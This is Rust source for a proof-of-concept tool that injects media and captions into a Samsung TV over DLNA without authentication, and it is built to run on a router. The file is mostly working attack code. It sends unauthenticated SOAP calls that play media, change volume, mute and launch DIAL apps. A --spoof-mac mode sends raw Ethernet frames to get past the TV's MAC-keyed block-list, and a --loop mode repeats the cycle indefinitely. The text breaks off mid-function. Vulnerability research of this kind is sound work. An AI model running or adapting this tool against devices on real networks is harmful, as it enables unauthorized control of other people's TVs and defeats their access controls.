//! Unauthenticated DLNA media + caption injection against the owner's own
//! Samsung UE43NU7470, built to run *on* the owner's RV6699 router.
//!
//! Port of caption_poc.py. Everything the Python version learned the hard way is
//! preserved here, because most of it was only discovered by reversing the TV's
//! own firmware (libDlnaReaderCore.so / libgstDlnaPlugin.so):
//!
//!   * `Server:` must carry the `DLNADOC/1.50` token, and every media response
//!     ends with `Connection: close` + an actual shutdown - that is what miniDLNA
//!     does unconditionally (upnphttp.c start_dlna_header).
//!   * Samsung sets `getMediaInfo.sec` / `getCaptionInfo.sec` on its requests and
//!     expects `MediaInfo.sec` / `CaptionInfo.sec` back.
//!   * An open-ended `Range: bytes=N-` must be served to EOF. Truncating it to a
//!     window makes the renderer report ERROR_OCCURRED within two seconds.
//!   * Captions are bound through DIDL `<sec:CaptionInfoEx>` and served as
//!     `smi/caption` with CRLF line endings.
//!   * The DIDL `<res>` needs size/duration/bitrate/resolution, otherwise
//!     GetPositionInfo reports TrackDuration 0:00:00.
//!
//! Everything here is unauthenticated: no token, no pairing, no on-screen prompt.
//! Run it against your own equipment only.

mod rawtcp;

use std::collections::BTreeMap;
use std::fs::File;
use std::io::{BufRead, BufReader, ErrorKind, Read, Seek, SeekFrom, Write};
use std::net::{Shutdown, TcpListener, TcpStream, ToSocketAddrs, UdpSocket};
// MIPS32 has max-atomic-width = 32, so there is no AtomicU64 on this target.
// Counters are AtomicUsize (32-bit here) and the byte total lives behind a Mutex.
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

// ---------------------------------------------------------------- constants

const DEFAULT_TV: &str = "192.168.1.70";
const DEFAULT_PORT: u16 = 8099;

const RC_NS: &str = "urn:schemas-upnp-org:service:RenderingControl:1";
const AV_NS: &str = "urn:schemas-upnp-org:service:AVTransport:1";

/// miniDLNA's MINIDLNA_SERVER_STRING shape. Samsung gates behaviour on the
/// `DLNADOC/1.50` token being present.
const SERVER_HDR: &str = "Linux/3.10.0 DLNADOC/1.50 UPnP/1.0 CaptionCast/1.0";

/// The media is expected to be H.264 Main / 1280x720 / square pixels / AAC-LC so
/// that the advertised profile and the actual content agree.
const DLNA_FEATURES: &str = "DLNA.ORG_PN=AVC_MP4_MP_HD_720p_AAC;DLNA.ORG_OP=01;\
DLNA.ORG_CI=0;DLNA.ORG_FLAGS=01700000000000000000000000000000";

/// SRT wants CRLF. LF alone can upset Samsung's parser.
const SRT_BODY: &str = concat!(
    "1\r\n00:00:01,000 --> 00:00:10,000\r\nwww microsoft\r\n\r\n",
    "2\r\n00:00:10,000 --> 00:00:20,000\r\nwww microsoft\r\n\r\n",
    "3\r\n00:00:20,000 --> 00:00:34,000\r\nwww microsoft\r\n\r\n",
);

/// `--remote` points the TV at a public clip so our own server leaves the path.
/// Must be plain http:// - the renderer rejects an https:// URI outright.
const REMOTE_SAMPLE: &str = "http://www.w3schools.com/html/mov_bbb.mp4";

/// The router has little RAM; do not let每 connection thread take the 2 MB default.
const THREAD_STACK: usize = 96 * 1024;
const CHUNK: usize = 64 * 1024;

// ---------------------------------------------------------------- spoofing

/// When set, every SOAP control call is built as raw Ethernet frames carrying a
/// MAC that is not ours, instead of going through the kernel's TCP stack. The
/// media server keeps the real address on purpose: the TV consults its
/// block-list where it *receives* the SOAP action (dmr -> GetAclEntryByMAC),
/// not where it fetches the file from.
static mut SPOOF: Option<rawtcp::Spoof> = None;

/// Set once in main() before any thread starts; read-only from then on.
fn spoof() -> Option<&'static rawtcp::Spoof> {
    #[allow(static_mut_refs)]
    unsafe { SPOOF.as_ref() }
}

// ---------------------------------------------------------------- shared state

struct Shared {
    media: String,
    caption_url: String,
    duration_ms: u64,
    /// serve the caption only when it is actually bound (see `--no-caption`)
    captions_on: bool,
    hits: Mutex<Vec<String>>,
    served: Mutex<u64>,
    accepted: AtomicUsize,
    open: AtomicUsize,
    start: Instant,
}

impl Shared {
    fn ts(&self) -> String {
        format!("t+{:6.2}s", self.start.elapsed().as_secs_f64())
    }
    fn note(&self, line: String) {
        if let Ok(mut h) = self.hits.lock() {
            h.push(line);
        }
    }
}

// ---------------------------------------------------------------- tiny helpers

fn xesc(s: &str) -> String {
    let mut o = String::with_capacity(s.len() + 8);
    for c in s.chars() {
        match c {
            '&' => o.push_str("&amp;"),
            '<' => o.push_str("&lt;"),
            '>' => o.push_str("&gt;"),
            '"' => o.push_str("&quot;"),
            _ => o.push(c),
        }
    }
    o
}

/// UPnP `res@duration` wants H:MM:SS.mmm
fn didl_duration(sec: f64) -> String {
    let total = sec as u64;
    let ms = ((sec - total as f64) * 1000.0) as u64;
    format!("{}:{:02}:{:02}.{:03}", total / 3600, (total % 3600) / 60, total % 60, ms)
}

/// Our address on the path towards the TV, without needing to know the interface.
fn my_ip(tv: &str) -> std::io::Result<String> {
    let s = UdpSocket::bind("0.0.0.0:0")?;
    s.connect((tv, 9197))?;
    Ok(s.local_addr()?.ip().to_string())
}

// ---------------------------------------------------------------- mp4 probing

struct Clip {
    duration: f64,
    width: u32,
    height: u32,
    size: u64,
}

fn be32(b: &[u8], o: usize) -> u32 {
    u32::from_be_bytes([b[o], b[o + 1], b[o + 2], b[o + 3]])
}
fn be64(b: &[u8], o: usize) -> u64 {
    let mut v = [0u8; 8];
    v.copy_from_slice(&b[o..o + 8]);
    u64::from_be_bytes(v)
}

/// Walk one level of boxes, yielding (type, body_start, box_end).
fn atoms(b: &[u8], mut i: usize, end: usize) -> Vec<([u8; 4], usize, usize)> {
    let mut out = Vec::new();
    while i + 8 <= end {
        let mut sz = be32(b, i) as usize;
        let mut t = [0u8; 4];
        t.copy_from_slice(&b[i + 4..i + 8]);
        let mut hdr = 8usize;
        if sz == 1 {
            if i + 16 > end {
                break;
            }
            sz = be64(b, i + 8) as usize;
            hdr = 16;
        } else if sz == 0 {
            sz = end - i;
        }
        if sz < hdr || i + sz > end {
            break;
        }
        out.push((t, i + hdr, i + sz));
        i += sz;
    }
    out
}

/// Duration and display size straight out of mvhd/tkhd. Only the first 2 MB are
/// read, so the file must be faststart (moov up front) - which it must be anyway
/// for the TV to start without scanning the whole thing.
fn clip_info(path: &str) -> Option<Clip> {
    let size = std::fs::metadata(path).ok()?.len();
    let mut f = File::open(path).ok()?;
    let mut buf = vec![0u8; (2 << 20).min(size as usize)];
    let n = f.read(&mut buf).ok()?;
    buf.truncate(n);

    let mut duration = 0.0f64;
    let (mut w, mut h) = (0u32, 0u32);
    for (t, b, e) in atoms(&buf, 0, buf.len()) {
        if &t != b"moov" {
            continue;
        }
        for (t2, b2, e2) in atoms(&buf, b, e) {
            if &t2 == b"mvhd" {
                let (ts, du) = if buf[b2] == 1 {
                    (be32(&buf, b2 + 20) as u64, be64(&buf, b2 + 24))
                } else {
                    (be32(&buf, b2 + 12) as u64, be32(&buf, b2 + 16) as u64)
                };
                if ts > 0 {
                    duration = du as f64 / ts as f64;
                }
            } else if &t2 == b"trak" {
                for (t3, b3, _e3) in atoms(&buf, b2, e2) {
                    if &t3 != b"tkhd" {
                        continue;
                    }
                    // width/height are 16.16 fixed point right after the matrix
                    let off = if buf[b3] == 1 { 88 } else { 76 };
                    if b3 + off + 8 > buf.len() {
                        continue;
                    }
                    let ww = be32(&buf, b3 + off) >> 16;
                    let hh = be32(&buf, b3 + off + 4) >> 16;
                    if ww > 0 && hh > 0 {
                        w = ww; // audio tracks carry 0x0
                        h = hh;
                    }
                }
            }
        }
    }
    if duration > 0.0 {
        Some(Clip { duration, width: w, height: h, size })
    } else {
        None
    }
}

// ---------------------------------------------------------------- HTTP client

struct Url<'a> {
    host: &'a str,
    port: u16,
    path: &'a str,
}

fn parse_url(u: &str) -> Option<Url<'_>> {
    let rest = u.strip_prefix("http://")?;
    let (hostport, path) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None => (rest, "/"),
    };
    let (host, port) = match hostport.rsplit_once(':') {
        Some((h, p)) => (h, p.parse().ok()?),
        None => (hostport, 80u16),
    };
    Some(Url { host, port, path })
}

fn http_post(url: &str, headers: &[(&str, &str)], body: &[u8]) -> std::io::Result<(u16, String)> {
    http_request("POST", url, headers, body)
}

/// Minimal request with an explicit method. Returns (status, body). Good enough
/// for UPnP control and for DIAL, which needs POST and DELETE and is picky about
/// Content-Type - busybox wget always sends x-www-form-urlencoded and cannot
/// send DELETE at all, which is why this exists rather than a shell one-liner.
fn http_request(method: &str, url: &str, headers: &[(&str, &str)], body: &[u8])
    -> std::io::Result<(u16, String)>
{
    let u = parse_url(url)
        .ok_or_else(|| std::io::Error::new(ErrorKind::InvalidInput, "bad url"))?;
    let addr = (u.host, u.port)
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| std::io::Error::new(ErrorKind::NotFound, "resolve"))?;
    let mut s = TcpStream::connect_timeout(&addr, Duration::from_secs(8))?;
    s.set_read_timeout(Some(Duration::from_secs(15)))?;
    s.set_write_timeout(Some(Duration::from_secs(15)))?;

    let mut req = format!(
        "{} {} HTTP/1.1\r\nHost: {}:{}\r\nContent-Length: {}\r\nConnection: close\r\n",
        method,
        u.path,
        u.host,
        u.port,
        body.len()
    );
    for (k, v) in headers {
        req.push_str(&format!("{k}: {v}\r\n"));
    }
    req.push_str("\r\n");
    s.write_all(req.as_bytes())?;
    s.write_all(body)?;
    s.flush()?;

    let mut raw = Vec::new();
    s.read_to_end(&mut raw)?;
    let text = String::from_utf8_lossy(&raw).into_owned();
    let status = text
        .split_whitespace()
        .nth(1)
        .and_then(|c| c.parse().ok())
        .unwrap_or(0);
    let body = match text.find("\r\n\r\n") {
        Some(i) => text[i + 4..].to_string(),
        None => String::new(),
    };
    Ok((status, body))
}

fn soap(ctrl: &str, ns: &str, action: &str, inner: &str) -> (u16, String) {
    let envelope = format!(
        "<?xml version=\"1.0\"?>\
<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" \
s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body>\
<u:{action} xmlns:u=\"{ns}\"><InstanceID>0</InstanceID>{inner}\
</u:{action}></s:Body></s:Envelope>"
    );
    let soapaction = format!("\"{ns}#{action}\"");
    if let Some(sp) = spoof() {
        let u = parse_url(ctrl).expect("bad control url");
        let (host, port, path) = (u.host.to_string(), u.port, u.path.to_string());
        return match rawtcp::http_post(
            sp, &host, port, &path,
            &[("Content-Type", "text/xml; charset=\"utf-8\""),
              ("SOAPACTION", &soapaction)],
            envelope.as_bytes(),
        ) {
            Ok(v) => v,
            Err(e) => (0, e.to_string()),
        };
    }
    match http_post(
        ctrl,
        &[
            ("Content-Type", "text/xml; charset=\"utf-8\""),
            ("SOAPACTION", &soapaction),
        ],
        envelope.as_bytes(),
    ) {
        Ok(v) => v,
        Err(e) => (0, e.to_string()),
    }
}

/// Pull the text between `<tag>` and `</tag>`.
fn tag<'a>(xml: &'a str, name: &str) -> Option<&'a str> {
    let open = format!("<{name}>");
    let close = format!("</{name}>");
    let a = xml.find(&open)? + open.len();
    let b = xml[a..].find(&close)? + a;
    Some(&xml[a..b])
}

// ---------------------------------------------------------------- HTTP server

fn header<'a>(h: &'a BTreeMap<String, String>, k: &str) -> Option<&'a str> {
    h.get(&k.to_ascii_lowercase()).map(|s| s.as_str())
}

/// Parse a Range value into (start, end_inclusive, is_partial).
fn parse_range(v: &str, size: u64) -> (u64, u64, bool) {
    let spec = match v.trim().strip_prefix("bytes=") {
        Some(s) => s,
        None => return (0, size.saturating_sub(1), false),
    };
    let (a, b) = spec.split_once('-').unwrap_or((spec, ""));
    if a.is_empty() {
        // suffix range: the last N bytes
        let n: u64 = b.trim().parse().unwrap_or(0);
        let start = size.saturating_sub(n);
        (start, size.saturating_sub(1), true)
    } else {
        let start: u64 = a.trim().parse().unwrap_or(0);
        // An open-ended "bytes=N-" MUST be served to EOF. Capping it to a window
        // is valid HTTP but Samsung's player treats the short body as a broken
        // stream and errors out within two seconds.
        let end = b
            .trim()
            .parse::<u64>()
            .unwrap_or(size.saturating_sub(1))
            .min(size.saturating_sub(1));
        (start, end, true)
    }
}

fn dlna_common(out: &mut String) {
    // miniDLNA emits these on every media response and closes the socket after
    // the body, unconditionally.
    out.push_str("Connection: close\r\n");
    out.push_str("EXT:\r\n");
    out.push_str("realTimeInfo.dlna.org: DLNA.ORG_TLAG=*\r\n");
}

fn serve_srt(mut s: TcpStream, sh: &Shared, head_only: bool) -> std::io::Result<()> {
    println!("    <<< {} GET /poc.srt  [SUBTITLE FETCHED]", sh.ts());
    sh.note("srt".into());
    let body = SRT_BODY.as_bytes();
    let mut h = String::new();
    h.push_str("HTTP/1.1 200 OK\r\n");
    h.push_str(&format!("Server: {SERVER_HDR}\r\n"));
    // miniDLNA serves captions as smi/caption; text/* is wrong for Samsung.
    h.push_str("Content-Type: smi/caption\r\n");
    h.push_str(&format!("Content-Length: {}\r\n", body.len()));
    h.push_str("transferMode.dlna.org: Interactive\r\n");
    dlna_common(&mut h);
    h.push_str("\r\n");
    s.write_all(h.as_bytes())?;
    if !head_only {
        s.write_all(body)?;
    }
    let _ = s.flush();
    let _ = s.shutdown(Shutdown::Write);
    Ok(())
}

fn serve_media(
    mut s: TcpStream,
    sh: &Shared,
    hdrs: &BTreeMap<String, String>,
    head_only: bool,
) -> std::io::Result<()> {
    let size = std::fs::metadata(&sh.media)?.len();
    let rng = header(hdrs, "range");
    let (start, end, partial) = match rng {
        Some(v) => parse_range(v, size),
        None => (0, size.saturating_sub(1), false),
    };
    let length = end.saturating_sub(start) + 1;

    println!(
        "    <<< {} {} /media.mp4  Range={}",
        sh.ts(),
        if head_only { "HEAD" } else { "GET" },
        rng.unwrap_or("-")
    );
    // Samsung's own headers tell us what it wants back; log them, they matter.
    let interesting: Vec<String> = hdrs
        .iter()
        .filter(|(k, _)| {
            !matches!(
                k.as_str(),
                "host" | "range" | "accept" | "connection" | "user-agent" | "accept-encoding"
            )
        })
        .map(|(k, v)| format!("{k}: {v}"))
        .collect();
    if !interesting.is_empty() {
        println!("        hdrs: {}", interesting.join("; "));
    }
    sh.note("media".into());

    let mut h = String::new();
    h.push_str(if partial {
        "HTTP/1.1 206 Partial Content\r\n"
    } else {
        "HTTP/1.1 200 OK\r\n"
    });
    h.push_str(&format!("Server: {SERVER_HDR}\r\n"));
    h.push_str("Content-Type: video/mp4\r\n");
    h.push_str(&format!("Content-Length: {length}\r\n"));
    h.push_str("Accept-Ranges: bytes\r\n");
    if partial {
        h.push_str(&format!("Content-Range: bytes {start}-{end}/{size}\r\n"));
    }
    h.push_str("transferMode.dlna.org: Streaming\r\n");
    h.push_str(&format!("contentFeatures.dlna.org: {DLNA_FEATURES}\r\n"));
    // Samsung's proprietary handshake. Without SEC_Duration the renderer does not
    // learn the clip length; without CaptionInfo.sec it never binds the subtitle.
    if header(hdrs, "getmediainfo.sec").is_some() && sh.duration_ms > 0 {
        h.push_str(&format!("MediaInfo.sec: SEC_Duration={};\r\n", sh.duration_ms));
    }
    if header(hdrs, "getcaptioninfo.sec").is_some() && sh.captions_on {
        h.push_str(&format!("CaptionInfo.sec: {}\r\n", sh.caption_url));
    }
    dlna_common(&mut h);
    h.push_str("\r\n");
    s.write_all(h.as_bytes())?;
    if head_only {
        let _ = s.flush();
        let _ = s.shutdown(Shutdown::Write);
        return Ok(());
    }

    let mut f = File::open(&sh.media)?;
    f.seek(SeekFrom::Start(start))?;
    let mut left = length;
    let mut buf = vec![0u8; CHUNK];
    let t0 = Instant::now();
    let mut last_write = Instant::now();
    let mut max_gap = 0.0f64;
    let mut sent: u64 = 0;
    let mut why = "completed";

    while left > 0 {
        let want = CHUNK.min(left as usize);
        let n = match f.read(&mut buf[..want]) {
            Ok(0) => {
                why = "eof";
                break;
            }
            Ok(n) => n,
            Err(e) => {
                why = if e.kind() == ErrorKind::Interrupted { continue } else { "file error" };
                break;
            }
        };
        if let Err(e) = s.write_all(&buf[..n]) {
            why = match e.kind() {
                ErrorKind::ConnectionReset => "RST (peer reset)",
                ErrorKind::BrokenPipe => "FIN (peer closed, then we wrote)",
                ErrorKind::ConnectionAborted => "ABORTED locally",
                _ => "write error",
            };
            break;
        }
        // A blocking write hides stalls. The TV's reader runs select() with a
        // 5000 ms timeout (libDlnaReaderCore, 0x1388) and three attempts, so a
        // long gap here is exactly what would make it drop the session.
        let gap = last_write.elapsed().as_secs_f64();
        if gap > max_gap {
            max_gap = gap;
        }
        if gap >= 1.0 {
            println!(
                "    !!! {} WRITE STALLED {:.2}s after {:.2} MB{}",
                sh.ts(),
                gap,
                sent as f64 / 1e6,
                if gap >= 5.0 { "   <-- exceeds the TV's 5s read timeout" } else { "" }
            );
        }
        last_write = Instant::now();
        left -= n as u64;
        sent += n as u64;
        if let Ok(mut t) = sh.served.lock() { *t += n as u64; }
    }

    let _ = s.flush();
    let _ = s.shutdown(Shutdown::Write); // miniDLNA closes every media socket
    let el = t0.elapsed().as_secs_f64().max(0.001);
    println!(
        "    --- {} stream @{start} ended: {why}; sent {:.2} of {:.2} MB in {:.1}s \
         ({:.1} Mbit/s)  maxWriteGap={:.2}s",
        sh.ts(),
        sent as f64 / 1e6,
        length as f64 / 1e6,
        el,
        sent as f64 * 8.0 / 1e6 / el,
        max_gap
    );
    Ok(())
}

fn handle(stream: TcpStream, sh: Arc<Shared>) {
    let _ = stream.set_nodelay(true); // streaming: latency over batching
    let _ = stream.set_read_timeout(Some(Duration::from_secs(20)));
    let _ = stream.set_write_timeout(Some(Duration::from_secs(30)));

    let peer = stream
        .peer_addr()
        .map(|a| a.to_string())
        .unwrap_or_else(|_| "?".into());
    let n = sh.accepted.fetch_add(1, Ordering::Relaxed) + 1;
    let open = sh.open.fetch_add(1, Ordering::Relaxed) + 1;
    println!("    ~~~ {} ACCEPT #{n} from {peer}  ({open} open)", sh.ts());

    let res = (|| -> std::io::Result<()> {
        let mut rd = BufReader::new(stream.try_clone()?);
        let mut line = String::new();
        if rd.read_line(&mut line)? == 0 {
            return Ok(());
        }
        let mut it = line.split_whitespace();
        let method = it.next().unwrap_or("").to_string();
        let path = it.next().unwrap_or("/").to_string();

        let mut hdrs = BTreeMap::new();
        loop {
            let mut l = String::new();
            if rd.read_line(&mut l)? == 0 {
                break;
            }
            let t = l.trim_end();
            if t.is_empty() {
                break;
            }
            if let Some((k, v)) = t.split_once(':') {
                hdrs.insert(k.trim().to_ascii_lowercase(), v.trim().to_string());
            }
        }

        let head_only = method.eq_ignore_ascii_case("HEAD");
        if path.ends_with(".srt") {
            serve_srt(stream, &sh, head_only)
        } else {
            serve_media(stream, &sh, &hdrs, head_only)
        }
    })();
    if let Err(e) = res {
        // The TV aborts probe connections constantly; that is normal, not a fault.
        if !matches!(
            e.kind(),
            ErrorKind::ConnectionReset | ErrorKind::ConnectionAborted | ErrorKind::BrokenPipe
        ) {
            println!("    ~~~ {} handler error: {e}", sh.ts());
        }
    }
    let open = sh.open.fetch_sub(1, Ordering::Relaxed) - 1;
    println!("    ~~~ CLOSE  ({open} still open)");
}

// ---------------------------------------------------------------- DIDL / control

fn didl(media_uri: &str, cap_uri: Option<&str>, res_attrs: &str) -> String {
    let mut cap = String::new();
    let mut sub_res = String::new();
    if let Some(c) = cap_uri {
        cap = format!(
            "<sec:CaptionInfoEx sec:type=\"srt\">{0}</sec:CaptionInfoEx>\
<sec:CaptionInfo sec:type=\"srt\">{0}</sec:CaptionInfo>",
            xesc(c)
        );
        sub_res = format!(
            "<res protocolInfo=\"http-get:*:text/srt:*\">{}</res>",
            xesc(c)
        );
    }
    format!(
        "<DIDL-Lite xmlns=\"urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/\" \
xmlns:dc=\"http://purl.org/dc/elements/1.1/\" \
xmlns:upnp=\"urn:schemas-upnp-org:metadata-1-0/upnp/\" \
xmlns:sec=\"http://www.sec.co.kr/\">\
<item id=\"poc1\" parentID=\"0\" restricted=\"1\">\
<dc:title>poc</dc:title>\
<upnp:class>object.item.videoItem</upnp:class>\
{cap}\
<res protocolInfo=\"http-get:*:video/mp4:*\"{res_attrs}>{}</res>\
{sub_res}</item></DIDL-Lite>",
        xesc(media_uri)
    )
}

struct Tv {
    av: String,
    rc: String,
}

impl Tv {
    fn new(ip: &str) -> Self {
        Self {
            av: format!("http://{ip}:9197/upnp/control/AVTransport1"),
            rc: format!("http://{ip}:9197/upnp/control/RenderingControl1"),
        }
    }
    fn av(&self, action: &str, inner: &str) -> (u16, String) {
        soap(&self.av, AV_NS, action, inner)
    }
    fn rc(&self, action: &str, inner: &str) -> (u16, String) {
        soap(&self.rc, RC_NS, action, inner)
    }
    /// (state, status, "pos/duration")
    fn transport(&self) -> (String, String, String) {
        let (_, a) = self.av("GetTransportInfo", "");
        let st = tag(&a, "CurrentTransportState").unwrap_or("?").to_string();
        let sts = tag(&a, "CurrentTransportStatus").unwrap_or("?").to_string();
        let (_, b) = self.av("GetPositionInfo", "");
        let pos = tag(&b, "RelTime").unwrap_or("?");
        // TrackDuration 0:00:00 means the renderer never learned the clip length -
        // the symptom of a <res> element with no duration attribute.
        let dur = tag(&b, "TrackDuration").unwrap_or("?");
        (st, sts, format!("{pos}/{dur}"))
    }
}

// ---------------------------------------------------------------- CLI

struct Args {
    flags: Vec<String>,
}
impl Args {
    fn new() -> Self {
        Self { flags: std::env::args().skip(1).collect() }
    }
    fn has(&self, f: &str) -> bool {
        self.flags.iter().any(|a| a == f)
    }
    fn val(&self, f: &str) -> Option<String> {
        let i = self.flags.iter().position(|a| a == f)?;
        self.flags.get(i + 1).filter(|v| !v.starts_with("--")).cloned()
    }
}

fn usage() {
    println!(
        "captioncast - unauthenticated DLNA media/caption injection PoC (own equipment only)

  --tv <ip>          target renderer            (default {DEFAULT_TV})
  --media <path>     mp4 to serve, faststart    (default ./media.mp4)
  --port <n>         local HTTP port            (default {DEFAULT_PORT})
  --status           read-only: transport + caption state, then exit
  --vol              RenderingControl PoC: read volume, set it, read it back
  --set-volume <n>   volume --vol should set                    (default 6)
  --mute             also fire SetMute(1) during --vol
  --slideshow [on|off]  X_SetTVSlideShow on RenderingControl - the one screen
                     action an unapproved MAC is not gated on
  --theme <n>        slideshow theme id                        (default 0)
  --dial [App]       DIAL on :8080 - read the app state, then launch it. No
                     token and no ACL there, unlike :8001 and :9197
  --dial-arg <s>     launch parameters passed to the app, e.g. \"v=<videoid>\"
  --dial-stop        DELETE <App>/run instead of launching
  --dial-port <n>    DIAL port                                 (default 8080)
  --req <METHOD>     arbitrary request; needs --url, optional --body / --ct
  --banner <h:port>  connect to a port that is not HTTP and show what it says;
                     optional --send "raw\r\n" to prod it first
  --stop             Stop playback + disable the caption, then exit
  --no-caption       A/B control: same media, no subtitle bound
  --ctrl-caption     also fire X_ControlCaption(Enable) during playback
  --remote [url]     point the TV at a remote clip, bypassing our server
  --probe            after loading the URI, fire every action that could start
                     playback and report which ones the ACL refuses (705)
  --nopoll           do not poll the renderer while it streams
  --loop <seconds>   repeat the whole cycle forever, sleeping in between
  --spoof-mac <mac>  send SOAP from this MAC via raw frames (bypasses the
                     TV's MAC-keyed device block-list; needs root)
  --spoof-ip <ip>    source IP for the spoofed frames  (default 192.168.1.240)
  --tv-mac <mac>     TV's MAC; looked up in /proc/net/arp when omitted
  --if <iface>       interface for raw frames          (default br0)
  --help"
    );
}

// ---------------------------------------------------------------- main

fn main() {
    // --loop <seconds>: repeat the whole cycle in-process, so no shell wrapper is
    // needed and the spoof flags stay in one place.
    let every: Option<u64> = Args::new().val("--loop").and_then(|v| v.parse().ok());
    loop {
        run();
        match every {
            Some(s) => {
                println!("
--- sleeping {s}s ---
");
                thread::sleep(Duration::from_secs(s));
            }
            None => return,
        }
    }
}

fn run() {
    let args = Args::new();
    if args.has("--help") || args.has("-h") {
        usage();
        return;
    }

    let tv_ip = args.val("--tv").unwrap_or_else(|| DEFAULT_TV.to_string());
    let port: u16 = args
        .val("--port")
        .and_then(|v| v.parse().ok())
        .unwrap_or(DEFAULT_PORT);
    let media = args.val("--media").unwrap_or_else(|| "media.mp4".to_string());
    let tv = Tv::new(&tv_ip);

    // --spoof-mac turns the control channel into hand-built frames carrying a MAC
    // that is not ours. The TV's block-list is keyed on exactly that field
    // (dmr imports asf_upnp::cd_utils::GetAclEntryByMAC), so a blocked device can
    // present a different one without changing any interface address.
    if let Some(m) = args.val("--spoof-mac") {
        let src_ip = args.val("--spoof-ip").unwrap_or_else(|| "192.168.1.240".into());
        let iface = args.val("--if").unwrap_or_else(|| "br0".into());
        let dst_mac = match args.val("--tv-mac") {
            Some(v) => rawtcp::parse_mac(&v),
            None => {
                let ifn = args.val("--if").unwrap_or_else(|| "br0".into());
                let sm = rawtcp::parse_mac(&m);
                let si = rawtcp::parse_ip(&src_ip);
                match rawtcp::resolve(&ifn, sm, si, rawtcp::parse_ip(&tv_ip)) {
                    Ok(v) => v,
                    // fall back to whatever the kernel already knows
                    Err(e) => match rawtcp::arp_lookup(&tv_ip) {
                        Some(v) => v,
                        None => {
                            eprintln!("cannot resolve {tv_ip}: {e}");
                            std::process::exit(1);
                        }
                    },
                }
            }
        };
        println!("    [SPOOF] control channel as {m} / {src_ip} on {iface}                   (interface address untouched)");
        unsafe {
            SPOOF = Some(rawtcp::Spoof {
                iface,
                src_mac: rawtcp::parse_mac(&m),
                src_ip: rawtcp::parse_ip(&src_ip),
                dst_mac,
                dst_ip: rawtcp::parse_ip(&tv_ip),
            });
        }
        // Keep the spoofed IP resolvable for the whole run so the TV can always
        // send its SYN/ACK back, even after a long idle watch window.
        if let Some(sp) = spoof() {
            rawtcp::spawn_arp_responder(sp);
        }
    }

    // --vol: the RenderingControl half of the PoC, ported from vol_poc.py so both
    // live in one binary and both can run through a spoofed identity.
    // Read the volume, set it, read it back - no auth header anywhere.
    if args.has("--vol") {
        let want: u16 = args.val("--set-volume").and_then(|v| v.parse().ok()).unwrap_or(6);
        println!("=== Unauthenticated RenderingControl volume PoC vs {tv_ip} (no auth header) ===");

        let read = |label: &str| -> (u16, Option<u16>) {
            let (c, raw) = tv.rc("GetVolume", "<Channel>Master</Channel>");
            let v = tag(&raw, "CurrentVolume").and_then(|s| s.trim().parse::<u16>().ok());
            println!(
                "{label} GetVolume        -> HTTP {c}   CurrentVolume = {}",
                v.map(|v| v.to_string()).unwrap_or_else(|| "?".into())
            );
            (c, v)
        };

        let (_, v0) = read("[1]");
        let Some(v0) = v0 else {
            println!("    could not read the volume - is the TV awake and reachable?");
            return;
        };

        let (c, raw) = tv.rc(
            "SetVolume",
            &format!("<Channel>Master</Channel><DesiredVolume>{want}</DesiredVolume>"),
        );
        let code = tag(&raw, "errorCode").unwrap_or("?");
        let desc = tag(&raw, "errorDescription").unwrap_or("?");
        println!(
            "[2] SetVolume({want})     -> HTTP {c}   {}",
            if c == 200 { "OK (accepted)".to_string() } else { format!("UPnPError {code} / {desc}") }
        );
        if c != 200 {
            // Not a bug in this tool: dmr (dmr_service_app, SoundControlApi.cpp
            // updateSpeakerInfo) maps the current Sound Output to a speaker object,
            // and EXTERNAL_SPEAKER / BT_HEADSET / DUAL_BT_SPK all fall through to
            // NonSupportedSpeaker, whose setVolume fails -> 501. Only case 0,
            // "TV Speaker", accepts volume control, and RenderingControl exposes no
            // action to switch the output, so it cannot be forced remotely.
            println!("    501 here is a firmware gate, not a failure of the PoC: volume control");
            println!("    only works while Sound Output = TV Speaker. External speaker, BT");
            println!("    headset and dual BT all map to NonSupportedSpeaker in dmr, and no");
            println!("    DLNA action can change the output. To exercise it: TV Settings ->");
            println!("    Sound -> Sound Output -> TV Speaker, then re-run.");
        }

        if args.has("--mute") {
            let (c, raw) = tv.rc("SetMute", "<Channel>Master</Channel><DesiredMute>1</DesiredMute>");
            println!(
                "[2b] SetMute(1)      -> HTTP {c}   {}",
                if c == 200 { "OK".into() } else { format!("UPnPError {}", tag(&raw, "errorCode").unwrap_or("?")) }
            );
        }

        let (_, v1) = read("[3]");
        println!("\n=== RESULT ===");
        match v1 {
            Some(v) if v == want => {
                println!("CONFIRMED: volume read {v0} -> set to {want} -> read back {v}, all over UPnP");
                println!("with NO authentication. Unauthenticated state manipulation, proven live.");
                println!("(the original volume {v0} was NOT restored)");
            }
            Some(v) => println!("SetVolume did not take effect (read back {v}); see the codes above."),
            None => println!("could not read the volume back."),
        }
        return;
    }

    // --req: arbitrary method/URL/body, because the surface keeps needing verbs
    // and content types the router's busybox cannot produce (no nc, wget forces
    // x-www-form-urlencoded and cannot DELETE or PUT).
    if args.has("--req") {
        let method = args.val("--req").unwrap_or_else(|| "GET".into());
        let Some(url) = args.val("--url") else {
            eprintln!("--req needs --url");
            return;
        };
        let body = args.val("--body").unwrap_or_default();
        let ct = args.val("--ct").unwrap_or_else(|| "text/plain; charset=utf-8".into());
        let hdrs: Vec<(&str, &str)> =
            if body.is_empty() { vec![] } else { vec![("Content-Type", ct.as_str())] };
        match http_request(&method, &url, &hdrs, body.as_bytes()) {
            Ok((c, b)) => {
                println!("{method} {url} -> HTTP {c}");
                if !b.is_empty() {
                    println!("{}", &b[..b.len().min(1200)]);
                }
            }
            Err(e) => println!("{method} {url} -> {e}"),
        }
        return;
    }

    // --banner: some ports accept a connection and then say nothing over HTTP
    // (15500 here), which means a protocol that is not HTTP. Connect, optionally
    // send something, and show whatever comes back as text and hex.
    if args.has("--banner") {
        let target = args.val("--banner").unwrap_or_else(|| format!("{tv_ip}:15500"));
        let send = args.val("--send").unwrap_or_default();
        println!("=== banner {target} ===");
        let addr = match target.to_socket_addrs().ok().and_then(|mut a| a.next()) {
            Some(a) => a,
            None => { eprintln!("cannot resolve {target}"); return; }
        };
        match TcpStream::connect_timeout(&addr, Duration::from_secs(5)) {
            Ok(mut s) => {
                let _ = s.set_read_timeout(Some(Duration::from_secs(3)));
